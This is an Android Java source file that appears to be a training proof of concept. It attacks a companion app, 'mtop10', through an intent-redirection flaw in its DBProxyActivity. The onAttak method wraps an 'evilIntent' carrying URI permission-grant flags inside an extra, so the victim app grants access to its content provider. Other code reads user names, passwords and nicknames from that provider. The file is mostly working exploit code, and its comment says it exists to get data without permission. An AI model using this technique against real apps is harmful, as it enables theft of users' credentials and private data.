package com.csy6;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.appcompat.app.AppCompatActivity;

import android.content.Intent;
import android.database.Cursor;
import android.graphics.Color;
import android.net.Uri;
import android.os.Bundle;
import android.os.PersistableBundle;
import android.view.View;
import android.widget.TextView;
import android.widget.Toast;

/**
 * приложение может запрашивать разрешения на доступ к данным у MTOP10 штатным образом,
 * а также использовать уязвимость в DBProxyActivity, чтобы получать данные без разрешений
 */
public class MainAttakActivity extends AppCompatActivity {
    public static final String AUTHORITY = "com.grooming.mtop10.provider.temporarycontentprovider";
    int defaultColor;
    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        defaultColor = ((TextView)findViewById(R.id.tv_data)).getCurrentTextColor();
    }

    public void onClick(View view) {
        Uri uri = Uri.parse("content://"+AUTHORITY+"/users");
//        getNicksData(uri);
        getAllData(uri);
    }



    void getNicksData(Uri uri){
//        Uri uri = Uri.parse("content://"+AUTHORITY+"/users/nicks");
        TextView textView = findViewById(R.id.tv_data);
        textView.setText("");
        textView.setTextColor(defaultColor);
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            while (cursor.moveToNext()) {
                String nick = cursor.getString(0);
                textView.append(String.format("\n %s", nick));
            }
            cursor.close();
        }catch (Exception e){
            textView.setText("error:\n"+e.getLocalizedMessage());
            textView.setTextColor(Color.RED);
        }
    }
    void getAllData(Uri uri){
//        Uri uri = Uri.parse("content://"+AUTHORITY+"/users");
//        com.grooming.mtop10.temporary/users
        TextView textView = findViewById(R.id.tv_data);
        textView.setText("");
        textView.setTextColor(defaultColor);
        try {
            Cursor cursor = getContentResolver().query(uri, null, null, null, null);
            if (cursor != null) {
                while (cursor.moveToNext()) {

                    String name = cursor.getString(1);
                    int id = cursor.getInt(0);
                    String pass = cursor.getString(2);
                    String nick = cursor.getString(3);
                    textView.append(String.format("\n %d %s %s %s", id, name, pass, nick));
                }
                cursor.close();
            } else {
                textView.append("cursor in null");
            }
        } catch (Exception e){
            textView.setText("error:\n"+e.getLocalizedMessage());
            textView.setTextColor(Color.RED);
        }
    }
    public void onRequestPermission(View view) {
        Intent intent = new Intent();
        intent.setClassName("com.grooming.mtop10","com.grooming.mtop10.DBActivity");
        startActivityForResult(intent,111);
    }
    @Override
    protected void onActivityResult(int requestCode, int resultCode, @Nullable Intent data) {
        super.onActivityResult(requestCode, resultCode, data);
        if(resultCode==RESULT_OK && requestCode ==  111){
            getNicksData(data.getData());
        } if(resultCode==RESULT_OK && requestCode ==  122){
//            getAllData(data.getData());
            getNicksData(data.getData());
        }
    }

    public void onAttak(View view) {
        Intent evilIntent = new Intent();
        evilIntent.setFlags(Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION | Intent.FLAG_GRANT_READ_URI_PERMISSION | Intent.FLAG_GRANT_WRITE_URI_PERMISSION);
        evilIntent.setClassName("com.grooming.mtop10","com.grooming.mtop10.TemporaryContentProvider");
//        evilIntent.setData(Uri.parse("content://"+AUTHORITY+"/users"));
        evilIntent.setData(Uri.parse("content://"+AUTHORITY+"/users/nicks"));
        Intent intent = new Intent();
        intent.setClassName("com.grooming.mtop10","com.grooming.mtop10.DBProxyActivity");
        intent.putExtra("TADA",evilIntent);
        startActivityForResult(intent,122);

    }
}